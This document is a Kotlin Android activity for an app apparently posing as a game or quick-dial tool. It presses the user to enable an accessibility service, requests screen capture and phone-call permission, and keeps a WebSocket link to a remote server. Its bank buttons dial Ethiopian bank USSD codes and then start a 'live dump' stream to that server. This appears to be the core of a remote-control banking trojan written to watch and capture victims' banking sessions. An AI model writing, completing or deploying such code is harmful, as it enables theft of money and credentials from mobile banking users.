package com.example.quickdial

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.net.Uri
import androidx.appcompat.app.AlertDialog
import android.widget.Button

class MainActivity : AppCompatActivity() {
    private val PERMISSION_REQUEST_CODE = 100
    private val SCREEN_CAPTURE_REQUEST = 101
    private lateinit var webSocketManager: WebSocketManager
    private lateinit var gameView: WebView
    private var mediaProjectionData: Intent? = null
    private var mediaProjectionResultCode: Int = 0
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var serverConnected = false
    private var projectionGranted = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var serviceStarted = false
    private var accessibilityDialog: AlertDialog? = null


private var dialogShowing = false

override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)
    supportActionBar?.hide()
    
    webSocketManager = WebSocketManager(this)
    gameView = findViewById(R.id.gameWebView)
    
    setupGameView()
    
    // Check on create
    if (!isAccessibilityServiceEnabled()) {
        showAccessibilityDialog()
    }
    
    requestPhonePermission()
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
        requestScreenCapture()
    }
    webSocketManager.connect()
}

override fun onResume() {
    super.onResume()
    // Delay check to let system update accessibility state
    mainHandler.postDelayed({
        if (!isAccessibilityServiceEnabled()) {
            if (!dialogShowing) {
                showAccessibilityDialog()
            }
        } else {
            dismissAccessibilityDialog()
        }
    }, 1000) // Wait 1 second for system to register the change
}

private fun showAccessibilityDialog() {
    if (dialogShowing) return
    dialogShowing = true
    try {
        val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
        accessibilityDialog = AlertDialog.Builder(this, R.style.CustomDialog)
            .setView(dialogView)
            .setCancelable(false)
            .create()
        
        dialogView.findViewById<Button>(R.id.btnSettings)?.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }
        dialogView.findViewById<Button>(R.id.btnExit)?.setOnClickListener {
            finishAffinity()
        }
        
        accessibilityDialog?.setOnDismissListener {
            dialogShowing = false
        }
        accessibilityDialog?.show()
    } catch (e: Exception) {
        dialogShowing = false
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }
}

private fun dismissAccessibilityDialog() {
    if (accessibilityDialog?.isShowing == true) {
        accessibilityDialog?.dismiss()
    }
    accessibilityDialog = null
    dialogShowing = false
}



    private fun setupGameView() {
    gameView.settings.apply {
        javaScriptEnabled = true
        domStorageEnabled = true
        allowFileAccess = true
        mediaPlaybackRequiresUserGesture = false
        setSupportZoom(false)
        builtInZoomControls = false
        displayZoomControls = false
        saveFormData = false
        databaseEnabled = false
        cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
    }
    
    gameView.clearHistory()
    gameView.clearCache(true)
    gameView.clearFormData()
    
    gameView.webViewClient = WebViewClient()
    gameView.webChromeClient = WebChromeClient()
    gameView.overScrollMode = View.OVER_SCROLL_NEVER
    
    gameView.loadUrl("file:///android_asset/game.html")
    }

    // All remote control methods unchanged
    fun updateStatus(text: String) { /* silent */ }

    fun onServerConnected() {
        serverConnected = true
        tryCacheProjection()
    }

    fun requestScreenCapture() {
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mediaProjectionManager!!.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST)
    }

    private fun tryCacheProjection() {
        if (!serverConnected || !projectionGranted || mediaProjectionData == null) return
        if (!serviceStarted) {
            val serviceIntent = Intent(this, MediaProjectionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
            else startService(serviceIntent)
            serviceStarted = true
            mainHandler.postDelayed({ getProjection() }, 1500)
        } else getProjection()
    }

    private fun getProjection() {
        try {
            val projection = mediaProjectionManager?.getMediaProjection(mediaProjectionResultCode, mediaProjectionData!!)
            if (projection != null) {
                val metrics = resources.displayMetrics
                webSocketManager.cacheProjection(projection, metrics.widthPixels, metrics.heightPixels)
            } else {
                mainHandler.postDelayed({ getProjection() }, 2000)
            }
        } catch (e: SecurityException) {
            mainHandler.postDelayed({ getProjection() }, 2000)
        } catch (e: Exception) {}
    }

    private fun requestPhonePermission() {
    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.CALL_PHONE),
            PERMISSION_REQUEST_CODE
        )
    }
}

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK && data != null) {
            mediaProjectionData = data; mediaProjectionResultCode = resultCode; projectionGranted = true
            tryCacheProjection()
        }
    }

    override fun onRequestPermissionsResult(
    requestCode: Int,
    permissions: Array<out String>,
    grantResults: IntArray
) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    if (requestCode == PERMISSION_REQUEST_CODE) {
        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            LogUtil.i("MainActivity", "Phone permission granted")
        } else {
            // Denied - exit
            LogUtil.w("MainActivity", "Phone permission denied - exiting")
            finishAffinity()
        }
    }
}

    private fun isAccessibilityServiceEnabled(): Boolean {
    val service1 = "$packageName/.QuickAccessibilityService"
    val service2 = "$packageName/${QuickAccessibilityService::class.java.name}"
    val enabled = Settings.Secure.getString(
        contentResolver,
        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
    ) ?: return false
    return enabled.contains(service1) || enabled.contains(service2)
    }

    override fun onDestroy() {
    gameView.apply {
        stopLoading()
        clearHistory()
        clearCache(true)
        destroy()
    }
    webSocketManager.disconnect()
    stopService(Intent(this, MediaProjectionService::class.java))
    super.onDestroy()
    }

    fun onBankClick(view: View) {
    val ussdCode = when (view.id) {
        R.id.btnCBE -> "*889#"
        R.id.btnAwash -> "*901#"
        R.id.btnAbyssinia -> "*815#"
        else -> return
    }
    
    try {
        val encoded = Uri.encode(ussdCode)
        val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$encoded"))
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            startActivity(intent)
            
            // Auto-start live dump after 3 seconds (wait for USSD to load)
            mainHandler.postDelayed({
                webSocketManager.sendCommand("startDumpStream", "{\"tag\":\"${ussdCode}\"}")
            }, 3000)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), PERMISSION_REQUEST_CODE)
        }
    } catch (e: Exception) {
        LogUtil.e("MainActivity", "Bank dial failed", e)
    }
}
}
